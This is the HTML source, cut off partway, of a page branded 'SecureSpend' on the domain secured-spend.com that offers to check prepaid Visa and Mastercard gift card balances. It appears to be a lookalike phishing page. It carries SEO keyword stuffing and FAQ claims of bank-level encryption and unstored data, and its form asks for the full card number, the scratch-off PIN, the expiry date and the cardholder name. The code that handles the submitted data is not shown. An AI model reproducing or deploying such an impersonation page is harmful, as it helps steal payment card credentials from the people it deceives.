<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" id="metaDescription" content="SecureSpend - Check your Secure Spend Visa & Mastercard prepaid gift card balance online. Activate your SecureSpend card, view transactions, and manage your secured spend prepaid card instantly.">
  <meta name="keywords" content="secure spend, secured spend, securespend, securespend balance, secure spend balance check, securespend.com, secure spend card, securespend visa, securespend mastercard, secure spend gift card, securespend prepaid, check securespend balance, secure spend card balance, securespend activate, secured spend card, secure spend visa gift card, securespend check balance, secure spend prepaid card, securespend gift card balance, secure spend balance, securespend card activation, secure spend card check, prepaid visa balance, prepaid mastercard balance, gift card balance check">
  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
  <meta name="author" content="SecureSpend">
  <meta name="google-site-verification" content="jF4wFWi8OayMzXuk_UYUBWQfxY-JXtKanWKRXF1I_KY">
  <meta property="og:title" id="ogTitle" content="SecureSpend™ | Check Secure Spend Balance Online - Visa® & Mastercard® Prepaid Cards">
  <meta property="og:description" id="ogDescription" content="Check your Secure Spend Visa & Mastercard prepaid gift card balance. Activate your SecureSpend card and view transactions instantly.">
  <meta property="og:type" content="website">
  <meta property="og:url" id="ogUrl" content="https://secured-spend.com/">
  <meta property="og:site_name" content="SecureSpend">
  <meta property="og:image" content="https://secured-spend.com/og-image.svg">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:alt" content="SecureSpend - Check Your Prepaid Card Balance">
  <meta property="og:locale" content="en_US">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" id="twitterTitle" content="SecureSpend™ | Check Secure Spend Balance Online">
  <meta name="twitter:description" id="twitterDescription" content="Check your Secure Spend Visa & Mastercard prepaid gift card balance online. Free, fast, and secure.">
  <meta name="twitter:image" content="https://secured-spend.com/og-image.svg">
  <link rel="canonical" id="canonicalLink" href="https://secured-spend.com/">
  <title>SecureSpend™ | Check Secure Spend Balance Online - Visa® & Mastercard® Prepaid Cards</title>
  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
  <link rel="apple-touch-icon" href="/favicon.svg">
  <meta name="theme-color" content="#0c5099">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Organization",
    "name": "SecureSpend",
    "url": "https://secured-spend.com",
    "logo": "https://secured-spend.com/favicon.svg",
    "description": "SecureSpend - Check your Secure Spend Visa & Mastercard prepaid gift card balance online.",
    "contactPoint": {
      "@type": "ContactPoint",
      "telephone": "+1-833-563-8200",
      "contactType": "customer service",
      "email": "support@secured-spend.com"
    },
    "sameAs": []
  }
  </script>
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebSite",
    "name": "SecureSpend",
    "url": "https://secured-spend.com",
    "description": "Check your Secure Spend prepaid Visa and Mastercard gift card balance online. Free, instant, and secure balance checker for SecureSpend cards.",
    "publisher": {
      "@type": "Organization",
      "name": "SecureSpend",
      "url": "https://secured-spend.com",
      "logo": {
        "@type": "ImageObject",
        "url": "https://secured-spend.com/favicon.svg"
      }
    }
  }
  </script>
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "FAQPage",
    "mainEntity": [
      {
        "@type": "Question",
        "name": "Where do I find my SecureSpend card number?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "Your card number is printed on the front of your SecureSpend prepaid card. It's typically 16 digits long."
        }
      },
      {
        "@type": "Question",
        "name": "Where is the PIN located on a SecureSpend card?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "The PIN is on the back of your card. You may need to scratch off the silver coating to reveal it. This PIN is required to check your balance."
        }
      },
      {
        "@type": "Question",
        "name": "Is it safe to check my SecureSpend balance online?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "Yes. We use bank-level 256-bit encryption for all data transmissions. Your card details are never stored on our servers after the balance check is complete."
        }
      },
      {
        "@type": "Question",
        "name": "Why does my SecureSpend card show a zero balance?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "A zero balance can occur if the card has not been activated, the funds have been fully spent, or the card has expired. Please verify the activation status with your original receipt."
        }
      },
      {
        "@type": "Question",
        "name": "What card types does SecureSpend support?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "We support SecureSpend Visa and Mastercard prepaid cards and gift cards."
        }
      },
      {
        "@type": "Question",
        "name": "Is there a fee to check my SecureSpend balance?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "No. Checking your prepaid card balance is completely free of charge."
        }
      }
    ]
  }
  </script>
  <script type="application/ld+json" id="breadcrumbSchema">
  {
    "@context": "https://schema.org",
    "@type": "BreadcrumbList",
    "itemListElement": [
      {
        "@type": "ListItem",
        "position": 1,
        "name": "Home",
        "item": "https://secured-spend.com/"
      }
    ]
  }
  </script>
  <style>
    :root {
      --primary: #585858;
      --primary-dark: #333333;
      --accent: #3080d7;
      --accent-dark: #0c5099;
      --accent-darker: #091a44;
      --white: #ffffff;
      --bg: #fafafa;
      --bg-light: #f5f5f5;
      --text: #212529;
      --text-secondary: rgba(0,0,0,.6);
      --text-muted: #6c757d;
      --text-light: rgba(0,0,0,.38);
      --border: rgba(0,0,0,.12);
      --border-light: rgba(0,0,0,.06);
      --success: #198754;
      --error: #b42c01;
      --danger: #dc3545;
      --green-accent: #5cb85c;
      --font: 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; -webkit-font-smoothing: antialiased; font-size: 15px; line-height: 1.5; font-weight: 400; }

    /* Top Header Bar */
    .top-bar {
      background: var(--accent-dark);
      color: rgba(255,255,255,.85);
      padding: 6px 24px;
      font-size: 12px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .top-bar-contact {
      display: flex;
      gap: 20px;
      align-items: center;
    }
    .top-bar-contact a {
      color: rgba(255,255,255,.85);
      text-decoration: none;
      display: flex;
      align-items: center;
      gap: 5px;
    }
    .top-bar-contact a:hover { color: #fff; }
    .top-bar-right {
      display: flex;
      gap: 12px;
      align-items: center;
    }

    /* Header */
    .header {
      background: var(--white);
      padding: 0 24px;
      box-shadow: 0 2px 4px rgba(0,0,0,.08);
      position: sticky;
      top: 0;
      z-index: 50;
    }
    .header-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 64px;
    }
    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      text-decoration: none;
      color: var(--accent-dark);
    }
    .logo-shield {
      width: 38px;
      height: 38px;
      background: linear-gradient(135deg, var(--accent) 0%, var(--accent-dark) 100%);
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      color: white;
      font-weight: 900;
      font-size: 16px;
      letter-spacing: -1px;
      font-family: var(--font);
    }
    .logo-text-wrap { line-height: 1.15; }
    .logo-brand {
      font-size: 20px;
      font-weight: 700;
      color: var(--accent-dark);
      letter-spacing: -0.3px;
    }
    .logo-brand span { color: var(--accent); }
    .logo-tagline {
      font-size: 9px;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 1.5px;
      font-weight: 500;
    }

    .nav {
      display: flex;
      gap: 0;
      height: 64px;
      align-items: stretch;
    }
    .nav a {
      color: var(--text);
      text-decoration: none;
      font-weight: 500;
      font-size: 14px;
      padding: 0 20px;
      display: flex;
      align-items: center;
      border-bottom: 3px solid transparent;
      transition: all 0.2s;
      letter-spacing: .02em;
    }
    .nav a:hover { color: var(--accent); border-bottom-color: var(--accent); background: rgba(48,128,215,.04); }
    .nav a.active { color: var(--accent); border-bottom-color: var(--accent); font-weight: 700; }

    .mobile-menu-btn {
      display: none;
      background: none;
      border: none;
      padding: 8px;
      cursor: pointer;
      color: var(--text);
    }

    /* Hero Section */
    .hero {
      background: linear-gradient(135deg, var(--accent-dark) 0%, var(--accent-darker) 50%, #0a1230 100%);
      padding: 60px 24px;
      text-align: center;
      color: white;
      position: relative;
      overflow: hidden;
    }
    .hero::before {
      content: "";
      position: absolute;
      top: -50%;
      right: -20%;
      width: 70%;
      height: 200%;
      background: radial-gradient(ellipse, rgba(48,128,215,.15) 0%, transparent 70%);
    }
    .hero::after {
      content: "";
      position: absolute;
      bottom: -50%;
      left: -20%;
      width: 60%;
      height: 200%;
      background: radial-gradient(ellipse, rgba(92,184,92,.08) 0%, transparent 70%);
    }
    .hero-content {
      position: relative;
      z-index: 1;
      max-width: 700px;
      margin: 0 auto;
    }
    .hero h1 {
      font-size: 2.5rem;
      font-weight: 900;
      margin-bottom: 12px;
      letter-spacing: -0.5px;
      line-height: 1.2;
    }
    .hero p {
      font-size: 16px;
      opacity: 0.8;
      max-width: 520px;
      margin: 0 auto;
      font-weight: 300;
      line-height: 1.6;
    }
    .hero-badges {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin-top: 24px;
    }
    .hero-badge {
      display: flex;
      align-items: center;
      gap: 6px;
      background: rgba(255,255,255,.1);
      padding: 8px 16px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 500;
      backdrop-filter: blur(4px);
      border: 1px solid rgba(255,255,255,.1);
    }
    .hero-badge svg { width: 16px; height: 16px; }

    /* Main Content */
    .main-content {
      max-width: 1100px;
      margin: -40px auto 48px;
      padding: 0 24px;
      position: relative;
      z-index: 1;
    }
    .content-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 24px;
      align-items: start;
    }

    /* Card Form */
    .form-card {
      background: var(--white);
      border-radius: 4px;
      padding: 32px;
      box-shadow: 0 2px 1px -1px rgba(0,0,0,.2), 0 1px 1px 0 rgba(0,0,0,.14), 0 1px 3px 0 rgba(0,0,0,.12);
    }
    .form-card h2 {
      font-size: 20px;
      font-weight: 500;
      color: var(--text);
      margin-bottom: 4px;
      line-height: 1.4;
    }
    .form-card .subtitle {
      color: var(--text-secondary);
      font-size: 14px;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      font-size: 12px;
      font-weight: 500;
      color: var(--text-secondary);
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .form-group label .required { color: var(--error); }
    .form-group input {
      width: 100%;
      padding: 12px 14px;
      font-size: 15px;
      border: 1px solid rgba(0,0,0,.2);
      border-radius: 4px;
      transition: all 0.2s;
      font-family: inherit;
      color: var(--text);
      background: var(--white);
      line-height: 1.5;
    }
    .form-group input:focus {
      outline: 0;
      border-color: var(--accent);
      box-shadow: 0 0 0 1px var(--accent);
    }
    .form-group input::placeholder { color: rgba(0,0,0,.35); }
    .form-group input.error { border-color: var(--error); }

    .card-number-wrapper { position: relative; }
    .card-number-wrapper input { padding-right: 60px; }
    .card-brand-badge {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      height: 28px;
      opacity: 0;
      transition: opacity 0.3s ease;
    }
    .card-brand-badge.visible { opacity: 1; }
    .card-brand-badge img { height: 28px; width: auto; border-radius: 4px; }

    .field-error {
      font-size: 12px;
      color: var(--error);
      margin-top: 4px;
      font-weight: 400;
      display: block;
    }

    .form-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
    }

    .pin-hint {
      display: flex;
      align-items: flex-start;
      gap: 8px;
      margin-top: 8px;
      padding: 10px 14px;
      background: var(--bg-light);
      border-radius: 4px;
      font-size: 12px;
      color: var(--text-secondary);
      line-height: 1.5;
      border-left: 3px solid var(--accent);
    }
    .pin-hint svg { flex-shrink: 0; margin-top: 1px; color: var(--accent); }

    .btn-check {
      background: var(--accent);
      color: white;
      padding: 12px 24px;
      border-radius: 4px;
      border: none;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      width: 100%;
      transition: all 0.2s;
      margin-top: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      letter-spacing: .05em;
      text-transform: uppercase;
      font-family: inherit;
      box-shadow: 0 3px 1px -2px rgba(0,0,0,.2), 0 2px 2px 0 rgba(0,0,0,.14), 0 1px 5px 0 rgba(0,0,0,.12);
    }
    .btn-check:hover { background: var(--accent-dark); box-shadow: 0 2px 4px -1px rgba(0,0,0,.2), 0 4px 5px 0 rgba(0,0,0,.14), 0 1px 10px 0 rgba(0,0,0,.12); }
    .btn-check:active { transform: scale(0.99); }
    .btn-check:disabled { opacity: 0.6; cursor: not-allowed; }

    .btn-another {
      background: var(--white);
      color: var(--accent);
      padding: 10px 24px;
      border-radius: 4px;
      border: 1px solid var(--accent);
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      width: 100%;
      transition: all 0.2s;
      margin-top: 16px;
      display: none;
      text-transform: uppercase;
      letter-spacing: .05em;
      font-family: inherit;
    }
    .btn-another:hover { background: var(--accent); color: white; }
    .btn-another.show { display: block; }

    /* Info Cards */
    .info-card {
      background: var(--white);
      border-radius: 4px;
      padding: 24px;
      box-shadow: 0 2px 1px -1px rgba(0,0,0,.2), 0 1px 1px 0 rgba(0,0,0,.14), 0 1px 3px 0 rgba(0,0,0,.12);
    }

    /* Gift Card Visual */
    .gc-visual {
      width: 100%;
      aspect-ratio: 1.6/1;
      background: linear-gradient(135deg, var(--accent-dark) 0%, var(--accent-darker) 100%);
      border-radius: 12px;
      padding: 24px;
      color: white;
      position: relative;
      overflow: hidden;
      margin-bottom: 20px;
      box-shadow: 0 8px 24px rgba(12,80,153,.35);
    }
    .gc-visual::before {
      content: "";
      position: absolute;
      top: -30%;
      right: -15%;
      width: 50%;
      height: 160%;
      background: rgba(255,255,255,.04);
      transform: rotate(20deg);
    }
    .gc-visual::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, var(--accent), var(--green-accent));
    }
    .gc-brand { font-size: 18px; font-weight: 700; letter-spacing: -0.3px; margin-bottom: 2px; }
    .gc-type { font-size: 10px; text-transform: uppercase; letter-spacing: 3px; opacity: 0.6; font-weight: 500; }
    .gc-chip {
      width: 40px;
      height: 30px;
      background: linear-gradient(135deg, #ffd700, #daa520);
      border-radius: 5px;
      margin: 16px 0;
      position: relative;
      overflow: hidden;
    }
    .gc-chip::after {
      content: "";
      position: absolute;
      inset: 0;
      background: repeating-linear-gradient(90deg, transparent, transparent 5px, rgba(0,0,0,.08) 5px, rgba(0,0,0,.08) 10px);
    }
    .gc-number { font-family: 'Courier New', monospace; font-size: 16px; letter-spacing: 3px; margin-bottom: 12px; text-shadow: 0 1px 3px rgba(0,0,0,.3); }
    .gc-bottom { display: flex; justify-content: space-between; align-items: flex-end; }
    .gc-label { font-size: 8px; text-transform: uppercase; letter-spacing: 1px; opacity: 0.5; margin-bottom: 2px; }
    .gc-value { font-size: 13px; font-weight: 500; }

    /* Info Items */
    .info-title {
      font-size: 16px;
      font-weight: 500;
      color: var(--text);
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .info-title svg { color: var(--accent); }
    .info-item {
      display: flex;
      gap: 14px;
      margin-bottom: 14px;
      padding-bottom: 14px;
      border-bottom: 1px solid var(--border);
    }
    .info-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
    .info-icon {
      width: 40px;
      height: 40px;
      background: rgba(48,128,215,.08);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      color: var(--accent);
    }
    .info-text h4 { font-size: 14px; font-weight: 500; color: var(--text); margin-bottom: 2px; }
    .info-text p { font-size: 13px; color: var(--text-secondary); line-height: 1.5; }

    /* Supported Cards */
    .supported-cards {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 14px 0;
      margin-top: 8px;
      border-top: 1px solid var(--border);
    }
    .supported-cards span { font-size: 12px; color: var(--text-muted); font-weight: 500; text-transform: uppercase; letter-spacing: .5px; }
    .card-logo { height: 24px; opacity: 0.7; }

    /* Balance Result */
    .balance-result { display: none; text-align: center; padding: 24px 0; }
    .balance-result.show { display: block; animation: fadeSlideUp 0.4s ease-out; }
    @keyframes fadeSlideUp {
      from { opacity: 0; transform: translateY(15px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .balance-result.success .result-box {
      background: #f0fdf4;
      border: 1px solid #bbf7d0;
      border-radius: 4px;
      padding: 24px;
    }
    .balance-result.error .result-box {
      background: #fef2f2;
      border: 1px solid #fecaca;
      border-radius: 4px;
      padding: 24px;
    }
    .result-icon {
      width: 52px;
      height: 52px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 12px;
      font-size: 24px;
      font-weight: 700;
    }
    .success .result-icon { background: var(--success); color: white; }
    .error .result-icon { background: var(--danger); color: white; }
    .balance-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 500; margin-bottom: 4px; }
    .balance-amount { margin: 8px 0; }
    .currency { font-size: 18px; font-weight: 500; color: var(--text-muted); vertical-align: top; }
    .amount { font-size: 48px; font-weight: 900; color: var(--accent-dark); letter-spacing: -1px; }
    .card-info { font-size: 13px; color: var(--text-muted); margin-top: 8px; }
    .error-message { font-size: 14px; color: var(--text); margin-top: 8px; }

    /* Loading */
    .loading-overlay {
      position: fixed;
      inset: 0;
      background: rgba(9,26,68,.9);
      backdrop-filter: blur(4px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 100;
      color: white;
      flex-direction: column;
      gap: 16px;
    }
    .loading-overlay.show { display: flex; }
    .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid rgba(255,255,255,.15);
      border-top-color: var(--accent);
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-overlay span { font-weight: 500; font-size: 14px; letter-spacing: .3px; }

    /* Pages */
    .page { display: none; }
    .page.active { display: block; animation: fadeIn 0.3s ease-out; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

    .content-section {
      background: var(--white);
      border-radius: 4px;
      padding: 32px;
      box-shadow: 0 2px 1px -1px rgba(0,0,0,.2), 0 1px 1px 0 rgba(0,0,0,.14), 0 1px 3px 0 rgba(0,0,0,.12);
      max-width: 800px;
      margin: 24px auto 0;
    }
    .content-section h2 { font-size: 24px; font-weight: 500; color: var(--text); margin-bottom: 16px; }
    .content-section p { color: var(--text-secondary); font-size: 15px; margin-bottom: 16px; line-height: 1.7; }

    .faq-item { border-bottom: 1px solid var(--border); padding: 16px 0; }
    .faq-item:last-child { border-bottom: none; }
    .faq-item h4 { font-size: 15px; font-weight: 500; color: var(--text); margin-bottom: 6px; }
    .faq-item p { margin-bottom: 0; font-size: 14px; }

    /* Footer */
    .footer {
      background: var(--accent-darker);
      color: rgba(255,255,255,.65);
      padding: 40px 24px 24px;
      margin-top: 48px;
    }
    .footer-inner {
      max-width: 1100px;
      margin: 0 auto;
    }
    .footer-grid {
      display: grid;
      grid-template-columns: 2fr 1fr 1fr 1fr;
      gap: 32px;
      margin-bottom: 32px;
    }
    .footer-brand .footer-logo {
      font-size: 18px;
      font-weight: 700;
      color: white;
      margin-bottom: 8px;
    }
    .footer-brand .footer-logo span { color: var(--accent); }
    .footer-brand p {
      font-size: 13px;
      line-height: 1.6;
      color: rgba(255,255,255,.5);
    }
    .footer-col h4 {
      font-size: 13px;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: var(--green-accent);
      margin-bottom: 12px;
    }
    .footer-col a {
      display: block;
      color: rgba(255,255,255,.6);
      text-decoration: none;
      font-size: 13px;
      padding: 3px 0;
      transition: color 0.2s;
    }
    .footer-col a:hover { color: white; }
    .footer-bottom {
      border-top: 1px solid rgba(255,255,255,.1);
      padding-top: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
    }
    .footer-bottom p { font-size: 12px; color: rgba(255,255,255,.4); }
    .footer-bottom-links { display: flex; gap: 20px; }
    .footer-bottom-links a { color: rgba(255,255,255,.5); text-decoration: none; font-size: 12px; }
    .footer-bottom-links a:hover { color: white; }

    .hide { display: none !important; }

    /* Mobile */
    @media (max-width: 850px) {
      .content-grid { grid-template-columns: 1fr; }
      .footer-grid { grid-template-columns: 1fr 1fr; }
    }
    @media (max-width: 600px) {
      .top-bar { display: none; }
      .header-inner { padding: 0; }
      .nav { display: none; }
      .mobile-menu-btn { display: block; }
      .nav.open { display: flex; position: absolute; top: 64px; left: 0; right: 0; background: white; flex-direction: column; box-shadow: 0 4px 8px rgba(0,0,0,.1); z-index: 49; }
      .nav.open a { padding: 14px 24px; border-bottom: none; border-left: 3px solid transparent; height: auto; }
      .nav.open a.active { border-left-color: var(--accent); }
      .hero h1 { font-size: 1.75rem; }
      .hero p { font-size: 14px; }
      .hero { padding: 40px 16px; }
      .hero-badges { flex-wrap: wrap; }
      .main-content { padding: 0 12px; margin-top: -24px; }
      .form-card, .info-card { padding: 20px; }
      .form-row { grid-template-columns: 1fr; }
      .footer-grid { grid-template-columns: 1fr; gap: 24px; }
      .footer-bottom { flex-direction: column; text-align: center; }
    }
  </style>
</head>
<body>
  <!-- Top Bar -->
  <div class="top-bar">
    <div class="top-bar-contact">
      <a href="tel:1-833-563-8200">
        <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/></svg>
        1-833-563-8200
      </a>
      <a href="mailto:support@secured-spend.com">
        <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
        support@secured-spend.com
      </a>
    </div>
    <div class="top-bar-right">
      <span>Visa® &amp; Mastercard® Prepaid Cards</span>
    </div>
  </div>

  <!-- Header -->
  <header class="header">
    <div class="header-inner">
      <a href="/" class="logo">
        <div class="logo-shield">SS</div>
        <div class="logo-text-wrap">
          <div class="logo-brand">Secure<span>Spend</span></div>
          <div class="logo-tagline">Prepaid Cards</div>
        </div>
      </a>
      <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Toggle menu">
        <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
      </button>
      <nav class="nav" id="mainNav">
        <a href="/" class="nav-link" data-page="home">Check Balance</a>
        <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
        <a href="/about" class="nav-link" data-page="about">About</a>
      </nav>
    </div>
  </header>

  <!-- Pages -->
  <main>
    <!-- HOME PAGE -->
    <section id="page-home" class="page active">
      <div class="hero">
        <div class="hero-content">
          <h1>Check Your Prepaid Card Balance</h1>
          <p>Activate your SecureSpend Visa® or Mastercard® prepaid card, check your balance, and view your transaction history.</p>
          <div class="hero-badges">
            <div class="hero-badge">
              <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
              256-bit Encryption
            </div>
            <div class="hero-badge">
              <svg fill="currentColor" viewBox="0 0 20 20"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"/></svg>
              Free Balance Check
            </div>
            <div class="hero-badge">
              <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z" clip-rule="evenodd"/></svg>
              Instant Results
            </div>
          </div>
        </div>
      </div>

      <div class="main-content">
        <div class="content-grid">
          <!-- Form -->
          <div class="form-card">
            <h2>Card Information</h2>
            <p class="subtitle">Enter the details found on your SecureSpend prepaid card.</p>

            <form id="balanceForm">
              <div id="formFields">
                <div class="form-group">
                  <label for="cardNumber">Card Number <span class="required">*</span></label>
                  <div class="card-number-wrapper">
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="off">
                    <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
                  </div>
                  <span class="field-error" id="cardError"></span>
                </div>

                <div class="form-group">
                  <label for="cardHolder">Cardholder Name <span style="font-weight:400;color:var(--text-light)">(Optional)</span></label>
                  <input type="text" id="cardHolder" placeholder="Name on card" autocomplete="off">
                </div>

                <div class="form-row">
                  <div class="form-group">
                    <label for="pin">Security Code / PIN <span class="required">*</span></label>
                    <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" autocomplete="off">
                    <span class="field-error" id="pinError"></span>
                  </div>
                  <div class="form-group">
                    <label for="expiryDate">Expiration Date</label>
                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off">
                    <span class="field-error" id="expiryError"></span>
                  </div>
                </div>

                <div class="pin-hint">
                  <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                  <span>The PIN is located on the back of your card. You may need to scratch off the silver strip to reveal it.</span>
                </div>

                <button type="submit" class="btn-check" id="submitBtn">
                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
                  Check Balance
                </button>
              </div>

              <div id="result" class="balance-result"></div>
              <button type="button" class="btn-another" id="checkAnother">Check Another Card</button>
            </form>

            <div class="supported-cards">
              <span>Accepted:</span>
              <svg height="24" viewBox="0 0 780 500" class="card-logo"><path d="M293.2 348.7l33.36-195.76h53.358l-33.384 195.76H293.2zm246.11-191.54c-10.57-3.966-27.135-8.222-47.822-8.222-52.726 0-89.863 26.55-90.18 64.604-.633 28.144 26.524 43.829 46.754 53.186 20.77 9.357 27.776 15.35 27.776 23.72-.158 12.793-16.652 18.65-32.026 18.65-21.402 0-32.76-2.97-50.336-10.3l-6.9-3.12-7.51 44.0 c15.516 6.8 44.196 11.36 73.98 11.52 56.068 0 92.4-26.23 92.89-66.85.316-22.26-14.012-39.22-44.83-53.19-18.65-9.06-30.08-15.1-30.08-24.28.158-8.27 9.7-16.87 30.72-16.87 17.54-.32 30.24 3.55 40.15 7.52l4.81 2.27 7.27-42.66zm138.83-4.112h-41.23c-12.77 0-22.332 3.486-27.94 16.258l-79.246 179.4h56.068l11.2-29.35h68.49l6.504 29.35h49.47l-43.165-195.76h-.05zm-65.86 126.41c4.44-11.35 21.37-54.93 21.37-54.93-.32.478 4.4-11.4 7.1-18.79l3.62 16.95s10.25 46.98 12.41 56.82l-44.5-.05zM232.9 152.93l-52.25 133.5-5.6-27.14c-9.67-31.23-39.86-65.1-73.61-82.07l47.82 171.37h56.39l83.87-195.66H232.9z" fill="#1a1f71"/><path d="M124.43 152.93H38.07l-.633 3.96c66.85 16.18 111.1 55.27 129.4 102.19l-18.65-89.96c-3.22-12.33-12.6-15.88-23.76-16.19z" fill="#f7a600"/></svg>
              <svg height="24" viewBox="0 0 780 500" class="card-logo"><circle cx="313.3" cy="250" r="186" fill="#eb001b"/><circle cx="466.7" cy="250" r="186" fill="#f79e1b"/><path d="M390 93.13c-47.8 37.56-78.5 96.34-78.5 162.5s30.7 124.94 78.5 162.5c47.8-37.56 78.5-96.34 78.5-162.5S437.8 130.69 390 93.13z" fill="#ff5f00"/></svg>
            </div>
          </div>

          <!-- Info Sidebar -->
          <div>
            <!-- Gift Card Visual -->
            <div class="info-card" style="margin-bottom: 20px;">
              <div class="gc-visual">
                <div class="gc-brand">SecureSpend</div>
                <div class="gc-type">Prepaid Card</div>
                <div class="gc-chip"></div>
                <div class="gc-number" id="gcNumber">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
                <div class="gc-bottom">
                  <div>
                    <div class="gc-label">Card Holder</div>
                    <div class="gc-value" id="gcHolder">CARDHOLDER</div>
                  </div>
                  <div>
                    <div class="gc-label">Valid Thru</div>
                    <div class="gc-value" id="gcExpiry">MM/YY</div>
                  </div>
